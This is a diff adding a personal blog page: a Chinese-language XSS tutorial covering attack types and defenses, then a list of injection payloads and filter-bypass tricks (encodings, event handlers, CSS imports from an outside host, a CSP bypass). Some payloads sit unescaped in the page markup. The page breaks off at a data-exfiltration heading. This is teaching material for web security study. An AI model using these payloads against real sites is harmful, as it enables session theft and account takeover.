@@ -1,0 +1,1590 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="xss的一些理解和例题, shiango">
+    <meta name="description" content="A Freshman">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>xss的一些理解和例题 | shiango</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="shiango" type="application/atom+xml">
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">shiango</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>Contact</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">shiango</div>
+        <div class="logo-desc">
+            
+            A Freshman
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			Contact
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">xss的一些理解和例题</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/xss/">
+                                <span class="chip bg-color">xss</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2022-04-14
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><p>这部分的内容偏前端开发和后端服务器解析顺序以及过滤原理。</p>
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>跨站脚本（Cross-site scripting）。通常指的是通过利用<strong>网页开发时留下的漏洞</strong>，属于web前端的安全问题，通过巧妙的方法<strong>注入恶意Script指令代码</strong>到网页，使用户<strong>加载并执行攻击者恶意制造的网页程序</strong>。</p>
+<p>这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、 LiveScript、ActiveX、 Flash 或者甚至是普通的HTML。</p>
+<p>攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p>
+<p>漏洞的根源：没有很好的区分开代码和数据，导致攻击者可以利用系统缺陷，构造注入执行任意代码。</p>
+<p>介绍危害：</p>
+<p>通过 document.cookie 盗取 cookie中的信息</p>
+<p>使用 js或 css破坏页面正常的结构与样式</p>
+<p>流量劫持（通过访问某段具有 window.location.href 定位到其他页面）</p>
+<p>dos攻击：利用合理的客户端请求来占用过多的服务器资源，从而使合法用户无法得到服务器响应。并且通过携带过程的 cookie信息可以使服务端返回400开头的状态码，从而拒绝合理的请求服务。</p>
+<p>利用 iframe、frame、XMLHttpRequest或上述 Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作，并且攻击者还可以利用 iframe，frame进一步的进行 CSRF 攻击。</p>
+<p> • 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力。</p>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40851188/article/details/89381563">https://blog.csdn.net/weixin_40851188/article/details/89381563</a></p>
+<h3 id="一、类型"><a href="#一、类型" class="headerlink" title="一、类型"></a>一、类型</h3><h4 id="反射型-非持久-xss："><a href="#反射型-非持久-xss：" class="headerlink" title="反射型(非持久)xss："></a>反射型(非持久)xss：</h4><p>攻击者必须以某种方式（如电子邮箱）<strong>诱导用户访问一个精心设计的URL（恶意链接）</strong>，才能<strong>实施恶意代码在受害者主机浏览器上执行</strong>。把我们的恶意脚本<strong>通过 URL 的方式传递给了服务器</strong>，而<strong>服务器</strong>则只是<strong>不加处理的把脚本“反射”</strong>回访问者的浏览器而使访问者的浏览器执行相应的脚本。</p>
+<p>解释流程：</p>
+<pre><code> 1.攻击者诱导用户点击具有XSS攻击代码的目标网站链接
+(http://www.test.com?kw=&lt;script&gt;document.cookie&lt;/script&gt;， 假设test.com 是一个搜索网站)。 
+ 
+ 2.目标网站的服务器收到相应的链接，不作安全处理（问题就出在这里），处理完正常的业务逻辑，将搜索内容返回。（后端服务器解析前端代码没有进行相应的处理）
+
+  3.当搜索内容返回后，在用户端进行展示。并执行XSS攻击代码，(获取用户cookie等操作)。
+
+  4.攻击者通过向目标网站注入代码，代码客户端执行，并返回客户端的信息，完成了一次XSS攻击。
+</code></pre>
+<p>防御：</p>
+<p><strong>触发有后端的参与</strong>，要避免反射性 XSS，必须需要后端的协调，<strong>后端解析前端的数据时首先做相关的字串检测和转义处理</strong>。 </p>
+<p>场景：</p>
+<p>此类 XSS 通常出现在<strong>网站搜索栏、用户登录</strong>等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。需要被攻击者点击对应的链接才能触发，且受到XSS Auditor(chrome内置的XSS保护)、NoScript等防御手段的影响较大</p>
+<p>如：</p>
+<?php echo "<p>hello,$_GET['user']</p>"; ?>
+
+<p>可以设置user的值来达到注入：用户名设为<code>&lt;script&gt;alert(&quot;Tz&quot;)&lt;/script&gt;</code>,则会执行预设好的JavaScript代码。</p>
+<p>应用：以下如果没做好防御，容易出现漏洞隐患</p>
+<p>用户的输入或者一些用户可控参数未经处理地输出到页面上。</p>
+<p>将不可信数据插入到HTML标签之间时；// 例如div, p, td；</p>
+<p>将不可信数据插入到HTML属性里时；// 例如：<div width=$INPUT></div></p>
+<p>将不可信数据插入到SCRIPT里时；// 例如：<script>var message = ” $INPUT “;</script></p>
+<p>还有插入到Style属性里的情况，同样具有一定的危害性；// 例如&lt;span style=” property : $INPUT ”&gt;</span></p>
+<p>将不可信数据插入到HTML URL里时，// 例如：&lt;a href=”<a target="_blank" rel="noopener" href="http://www.ccc.com/?param=">http://www.abcd.com?param=</a> $INPUT ”&gt;</a></p>
+<p>使用富文本时，没有使用XSS规则引擎进行编码过滤。</p>
+<h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p> HTML 注入型/持久型）XSS 攻击</p>
+<p>事先将<strong>恶意代码上传或储存到漏洞服务器</strong>中，只要受害者<strong>浏览包含此恶意代码的页面就会执行恶意代码</strong>。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。</p>
+<p>场景</p>
+<p>最常发生在由社区内容驱动的网站或 Web 邮件网站，不需要特制的链接来执行。黑客仅仅需要提交 XSS 漏洞利用代码到一个网站上其他用户可能访问的地方（反射型XSS通常只在url中）。这些地区可能是<strong>博客评论，用户评论，留言板，聊天室，HTML 电子邮件，wikis，和其他的许多地方</strong>。一旦用户访问受感染的页，执行是自动的。</p>
+<h4 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h4><p>在客户端XSS攻击，也称为DOM-XSS，<strong>当用户在当前的页面自己输入具有问题的代码，导致页面被恶意注入</strong>，但是不会影响到服务器。</p>
+<p>如：</p>
+<p>当我们在<strong>输入框中输入 带有恶意代买的script标签 （死循环之类的）当我们点击确定，这段脚本就会作为标签插入当前页面</strong>。破坏当前页面执行。这种属于DOM-XSS，尽管不会对服务器产生影响，但是也要防范。</p>
+<p>修改页面的DOM节点形成的XSS，称之为DOM Based XSS</p>
+<h3 id="二、tricks"><a href="#二、tricks" class="headerlink" title="二、tricks"></a>二、tricks</h3><p>1.可以用来执行xss的标签</p>
+<p>on事件</p>
+<h1 onmousemove="alert('moved')">this is a title</h1>h1>
+
+<p>img标签:不存在/x路径下的图片，触发onerror事件执行代码</p>
+<img src=x onerror="alert('error')" />
+
+<p>2.JavaScript伪协议的触发</p>
+<p>JavaScript:void(0)</p>
+<p>再如：单击是不会跳转，而是执行。</p>
+<p><a href="javascript:alert(1)">click</a></p>
+<p>3.form标签触发：表单中才可</p>
+<p>4.iframe标签</p>
+<p>5.二次渲染导致的xss</p>
+<p>配合模板注入</p>
+<h5 id=""><a href="#" class="headerlink" title=""></a></h5><h5 id="1-html标签之间"><a href="#1-html标签之间" class="headerlink" title="1.html标签之间"></a>1.<strong>html标签之间</strong></h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello &lt;?=$name?&gt;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload：<span class="tag">&lt;<span class="name">scrip</span> <span class="attr">t</span>&gt;</span>alert&lt;/scri pt&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="2、标签属性中"><a href="#2、标签属性中" class="headerlink" title="2、标签属性中"></a>2、标签属性中</h5><pre><code>&lt;input type=&quot;text&quot; name=&quot;test123&quot; value=&quot;&lt;?=$name?&gt;&quot;&gt;
+payload：&lt;input type=&quot;test&quot; name=“test23” value=&quot;&quot; autofocus onfocus=&quot;alert(1)&quot;&gt;
+</code></pre>
+<h5 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a><strong>伪协议</strong></h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>clik<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="3、javascript变量中"><a href="#3、javascript变量中" class="headerlink" title="3、javascript变量中"></a>3、javascript变量中</h5><pre><code>&lt;?php
+ $name = $_GET[&#39;name&#39;];
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+        &lt;title&gt;test&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+        &lt;script type=&quot;text/javascript&quot;&gt;
+                var name = &quot;&lt;?=$name?&gt;&quot;;
+                document.write(&quot;hello &quot;+name);
+        &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+ 
+payload：?name=lusong&quot;%2balert(1);//        %2b ------ +
+         ?name=lusong&quot;;alert(1);//          换行执行
+</code></pre>
+<h3 id="三、过滤与绕过"><a href="#三、过滤与绕过" class="headerlink" title="三、过滤与绕过"></a>三、过滤与绕过</h3><p><img src="../images/16629186f58a4faca8e58e0957cc88d6.jpg" alt="16629186f58a4faca8e58e0957cc88d6"></p>
+<p>过滤：waf层和代码层</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/L2329794714/article/details/123709249">https://blog.csdn.net/L2329794714/article/details/123709249</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.fujieace.com/penetration-test/xss-100.html">https://www.fujieace.com/penetration-test/xss-100.html</a></p>
+<p>xss的一些常见绕过方法：</p>
+<h5 id="1-大小写绕过："><a href="#1-大小写绕过：" class="headerlink" title="1.大小写绕过："></a>1.大小写绕过：</h5><p>HTML<strong>对标签大小写不敏感</strong>，可以利用大小写混用绕过<br> 例如：<code>&lt;script&gt;改为&lt;ScRiPt&gt;</code></p>
+<h5 id="2-双写绕过"><a href="#2-双写绕过" class="headerlink" title="2.双写绕过"></a>2.双写绕过</h5><p>有些情况的规则会将<strong>黑名单标签替换为空</strong>，可以利用这一点构造标签<br> 例如：<code>&lt;script&gt;改为&lt;scr&lt;script&gt;ipt&gt;</code><br> 同理某些注释符在规则中也会替换为空，这时候可以利用它构造payload<br> 例如：<code>&lt;script&gt;改为&lt;scr&lt;!---test---&gt;ipt&gt;</code></p>
+<h5 id="3-开口标签"><a href="#3-开口标签" class="headerlink" title="3.开口标签"></a>3.开口标签</h5><p>在某些特殊环境，由于<strong>html代码补全机制</strong>，可以故意不闭合标签绕过黑名单检测<br> 例如：<code>&lt;script&gt;改为&lt;script</code></p>
+<h5 id="4-关闭标签"><a href="#4-关闭标签" class="headerlink" title="4.关闭标签"></a>4.关闭标签</h5><p>有时候我们需要关闭标签来使我们的XSS生效。</p>
+<p>比如：“&gt;<script>alert(“Hi”);</script></p>
+<p>再如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var name = <span class="string">&quot;&lt;?=<span class="variable">$name</span>?&gt;&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">输入：?name=<span class="built_in">test</span><span class="string">&quot;;alert(1);//</span></span><br><span class="line"><span class="string">变成：var name = &quot;</span><span class="built_in">test</span><span class="string">&quot;;alert(1);//&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>转义字符利用</p>
+<p>过滤了引号，在如下场景可以转义 \ </p>
+<pre><code>&lt;script&gt;
+var name =&quot;&lt;?=name?&gt;&quot;+&quot;&lt;?=age?&gt;&quot;;
+&lt;/script&gt;
+ 
+输入：?name=test\&amp;age=;alert(1);//
+ 
+变成：var name =&quot;test\&quot;+&quot;;alert(1);&quot;;
+</code></pre>
+<h5 id="5、隐藏payload于location-hash中"><a href="#5、隐藏payload于location-hash中" class="headerlink" title="5、隐藏payload于location.hash中"></a>5、隐藏payload于location.hash中</h5><p>location.hash：hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分</p>
+<p><a target="_blank" rel="noopener" href="https://www.baidu.com/#admin">https://www.baidu.com#admin</a></p>
+<p>location.hash 就为#admin</p>
+<p>#admin不会传输到服务端，所以不存在过滤。 </p>
+<h5 id="6-空格回车TAB"><a href="#6-空格回车TAB" class="headerlink" title="6.空格回车TAB"></a>6.空格回车TAB</h5><p>例如：js伪协议<code>javascript:alert(&#39;xss&#39;);可以改为java script:alert(&#39;xss&#39;);</code>等</p>
+<h5 id="7-其他非黑名单标签和事件-来触发on事件"><a href="#7-其他非黑名单标签和事件-来触发on事件" class="headerlink" title="7.其他非黑名单标签和事件(来触发on事件)"></a>7.其他非黑名单标签和事件(来触发on事件)</h5><p> 比如标签点击、聚焦、鼠标动作事件来触发代码执行</p>
+<p>标签闭合：注入点在标签属性中，闭合标签使注入点在=变成一个独立的标签</p>
+<p>如果不能依靠属性进行跨站，那么还可以利用事件处理函数。事件既能让JS脚本运行，自然也可以执行跨站，另外像onerror、onMouseover等都可利用的是事件处理函数</p>
+<p>（1）<img><br>payload：&lt;img src=1 οnerrοr=alert(“xss”);&gt;</p>
+<p>（2）<input><br>payload: <input onfocus="alert('xss');"><br>         &lt;input οnblur=alert(“xss”) autofocus&gt;<input autofocus> #竞争焦点，触发onblur事件<br>         <input onfocus="alert('xss');" autofocus> #通过autofocus属性执行本身的focus事件</p>
+<p>（3）<details><br>payload: <details ontoggle="alert('xss');"><br>         <details open ontoggle="alert('xss');"> #使用open属性触发ontoggle事件 </p>
+<p>（4）<svg><br>payload: &lt;svg οnlοad=alert(“xss”);&gt;</p>
+<p>（5）<iframe><br>payload: &lt;iframe οnlοad=alert(“xss”);&gt;</iframe></p>
+<p>（6）<body><br>payload: &lt;body/οnlοad=alert(“xss”);&gt;</p>
+<h5 id="8-编码转义（对标签属性值进行转码）"><a href="#8-编码转义（对标签属性值进行转码）" class="headerlink" title="8.编码转义（对标签属性值进行转码）"></a>8.编码转义（对标签属性值进行转码）</h5><p>过滤严谨的函数很可能对标签也进行了严格的控制，但是如果用其他形式表示标签,脚本仍能解析却可以绕过过滤</p>
+<p>常见的编码方式有：HTML实体编码(&amp;#ASCII),十进制、十六进制、八进制编码，unicode编码及escape编码及使用String.fromCharCode(…)绕过</p>
+<p>因此<img src= "javascriptt&#alert(/xss/);">可以实现绕过</p>
+<p>另外还可以把、、    等字符插入代码的头部或任意地方</p>
+<p>（1）绕过magic_quotes_gpc</p>
+<p>magic_quotes_gpc=ON是php中的安全设置，开启后会把一些特殊字符进行轮换，比如’(单引号)转换为\’，”(双引号)转换为\”，\转换为\</p>
+<p>比如：<script>alert(“xss”);</script>会转换为<script>alert(\”xss\”);</script>,这样我们的xss就不生效了。</p>
+<p>针对开启了magic_quotes_gpc的网站，我们可以通过javascript中的String.fromCharCode方法来绕过，我们可以把alert(“XSS”);转换为</p>
+<p>String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34,41)那么我们的XSS语句就变成了</p>
+<script>String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88,83, 83, 34, 41, 59)</script>
+
+<p>String.fromCharCode()是javascript中的字符串方法，用来把ASCII转换为字符串。</p>
+<p>最后使用<script>转换后的放到这里</script>包含即可。</p>
+<p>（2）base64编码</p>
+<p>payload: <script>eavl(atob("PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="));</script> #eval()用于将字符串当作程序执行，atob()用于解密base64  &lt;ahref=”data:text/html;base64”,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==”&gt;1</a></p>
+<p>（3）js编码</p>
+<p>Uncode编码<br> \u00+16进制<br> JS环境中，利用String.fromCharCode函数将 Unicode 编码转为字符</p>
+<p>JS解析器可对Unicode 编码进行解码,但编码后的数据不能作为js代码，编码后的 引号、函数等不能执行。页面原有js代码的js解析实在构建DOM树之前完成，所有js编码解析在html实体解析之前</p>
+<p>（4）hex编码</p>
+<p>我们可以对我们的语句进行hex编码来绕过XSS规则</p>
+<p>比如：<script>alert(“xss”);</script>可以转换为：<br> %3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%78%73%73%22%29%3b%3c%2f%73%63%72%69%70%74%3e</p>
+<p>（5）HTML实体编码</p>
+<p>html实体解析也不是在构建DOM树时解码的，所以被实体编码的字符在构建DOM树时不能被识别，比如 &lt;&gt;、src=、type=、href= 等等</p>
+<p> 但可以通过实体编码绕过后台过滤检测，比如用在<a>标签href属性里注入恶意代码，当点击的时候会也解码后的内容执行</p>
+<h5 id="9-利用CSS跨站剖析"><a href="#9-利用CSS跨站剖析" class="headerlink" title="9.利用CSS跨站剖析"></a>9.利用CSS跨站剖析</h5><p>之所以说CSS样式表是个很不错的载体，是因为CSS不需要嵌入到HTML代码中，可以直接从文件或其他地方进行引用. 另外CSS同样隐蔽、灵活，不过不同</p>
+<p>浏览器之间不能通用，如：</p>
+<div style = "list-style-image:url(javascript:alert(‘xSS‘))">
+
+<link rel = "stylesheet" href ="http://www.xxx.com/atack.css">
+
+<style type=‘text/css‘>@import url(http://www.xxx.com/xss.css);</style>
+
+<style>@import ‘javascript:alert(‘xss‘);‘</style>
+
+<h5 id="10、变量组合函数"><a href="#10、变量组合函数" class="headerlink" title="10、变量组合函数"></a>10、变量组合函数</h5><p>如果对js函数进行了过滤，可以用变量组合来构成函数，如对eva()函数进行过滤</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aaa=<span class="built_in">eval</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aaa(<span class="string">&quot;evil code&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h5 id="10-CSP过滤及绕过"><a href="#10-CSP过滤及绕过" class="headerlink" title="10.CSP过滤及绕过"></a>10.<strong>CSP过滤及绕过</strong></h5><p>CSP 内容安全策略，即规定只允许加载哪些特定资源，</p>
+<p><img src="/images/A81CAA24E7F715BACCEB0B1372FBB7AA.jpg" alt="A81CAA24E7F715BACCEB0B1372FBB7AA"></p>
+<p><img src="/images/1E93473737262852ED63AB3806420ACE.jpg" alt="1E93473737262852ED63AB3806420ACE"></p>
+<p>如下：只运行加载来自 *.baidu.com 的javascript代码</p>
+<?php
+header('Content-Security-Policy: script-src *.baidu.com')
+?>
+
+<p>对应 script-src ‘self’ 即只允许加载同源js文件，可以利用 文件上传，JSON接口来写入我们的恶意代码到服务端，再加载，这样就符合同源。</p>
+<h5 id="11、数据外带"><a href="#11、数据外带" class="headerlink" title="11、数据外带"></a>11、数据外带</h5><p>link标签</p>
